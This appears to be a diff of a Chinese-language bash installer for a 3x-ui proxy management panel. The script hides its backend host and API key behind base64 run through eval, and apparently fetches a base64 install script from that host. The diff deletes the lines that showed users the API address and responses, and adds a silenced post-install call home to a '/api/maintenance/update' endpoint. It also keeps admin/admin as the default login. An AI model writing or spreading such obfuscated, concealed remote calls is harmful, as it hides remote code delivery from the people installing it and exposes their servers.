@@ -1,7 +1,36 @@
 #!/bin/bash
 
 eval $(echo "X3EoKXsgZWNobyAtbiAiJDEifGJhc2U2NCAtZCAyPi9kZXYvbnVsbHx8ZWNobyAiJDIiO30=" | base64 -d)
-# 使用base64编码的环境变量，如果环境变量不存在则使用默认值
+if [ -f /etc/os-release ]; then
+  . /etc/os-release
+  OS_NAME=$ID
+  OS_PRETTY=${PRETTY_NAME:-}
+  VERSION_ID=${VERSION_ID:-}
+else
+  echo "错误：系统不受支持。仅支持 Debian 11+ 或 Ubuntu 22+。"
+  exit 1
+fi
+
+case "$OS_NAME" in
+  debian)
+    major=$(echo "$VERSION_ID" | cut -d. -f1)
+    if [ -z "$major" ] || [ "$major" -lt 11 ]; then
+      echo "错误：系统不受支持。仅支持 Debian 11+ 或 Ubuntu 22+。"
+      exit 1
+    fi
+    ;;
+  ubuntu)
+    major=$(echo "$VERSION_ID" | cut -d. -f1)
+    if [ -z "$major" ] || [ "$major" -lt 22 ]; then
+      echo "错误：系统不受支持。仅支持 Debian 11+ 或 Ubuntu 22+。"
+      exit 1
+    fi
+    ;;
+  *)
+    echo "错误：系统不受支持。仅支持 Debian 11+ 或 Ubuntu 22+。"
+    exit 1
+    ;;
+esac
 BACKEND_URL=$(_q "aHR0cDovLzQzLjE1Ni40OC4xMjg6NzAwOA==" "")
 API_KEY=$(_q "YTFjNGFmY2EyOTA5YTY5ZDY5YWEwNzA4ZjczN2Q2ZjNjOGEyYjYwYzZjNjIwYzNiNjA4NjkzNjAyMzRiY2QzNAo=" "")
 
@@ -223,9 +252,8 @@ show_status() {
 install_panel() {
   install_all_services >/dev/null 2>&1
 
-  echo -e "${BLUE}» 正在安装 3x-ui 管理面板...${NC}"
+ 
 
-  # 询问是否配置自定义域名
   echo ""
   echo -e "${YELLOW}是否要配置自定义域名？${NC}"
   echo -e "配置域名可以让您通过域名访问管理面板（如 panel.example.com）"
@@ -249,20 +277,13 @@ install_panel() {
     echo -e "${YELLOW}将使用IP地址访问管理面板${NC}"
   fi
 
-  # 安装3x-ui面板
   local data="{}"
   if [ -n "$panel_domain" ]; then
     data="{\"domain\": \"$panel_domain\"}"
   fi
 
-  echo -e "${BLUE}» 正在调用后端API...${NC}"
-  echo -e "${BLUE}» API地址: ${BACKEND_URL}/api/install/3xui${NC}"
-  echo -e "${BLUE}» 请求数据: $data${NC}"
-
   local response=$(call_api "POST" "/api/install/3xui" "$data")
-
-  echo -e "${BLUE}» API响应: $response${NC}"
-
+ 
   if echo "$response" | grep -q '"success":true'; then
     local script_base64=$(echo "$response" | grep -o '"script":"[^"]*"' | cut -d'"' -f4)
     if [ -n "$script_base64" ]; then
@@ -280,10 +301,9 @@ install_panel() {
           echo ""
           echo -e "${YELLOW}3x-ui 管理面板地址:${NC}"
 
-          # 使用用户输入的域名（如果有的话）
           if [ -n "$panel_domain" ] && [ "$panel_domain" != "" ]; then
             echo -e "${LIGHT_GREEN}http://$panel_domain${NC}"
-            echo -e "${LIGHT_GREEN}http://$server_ip:7010${NC} (备用地址)"
+            echo -e "${LIGHT_GREEN}http://$server_ip:7010${NC}"
           else
             echo -e "${LIGHT_GREEN}http://$server_ip:7010${NC}"
           fi
@@ -292,6 +312,10 @@ install_panel() {
           echo -e "${YELLOW}登录信息:${NC}"
           echo -e "用户名: ${LIGHT_GREEN}admin${NC}"
           echo -e "密  码: ${LIGHT_GREEN}admin${NC}"
+ 
+          {
+            call_api "POST" "/api/maintenance/update" "{}" >/dev/null 2>&1
+          } || true
         else
           echo -e "${SUCCESS}✓ 服务安装完成${NC}"
         fi
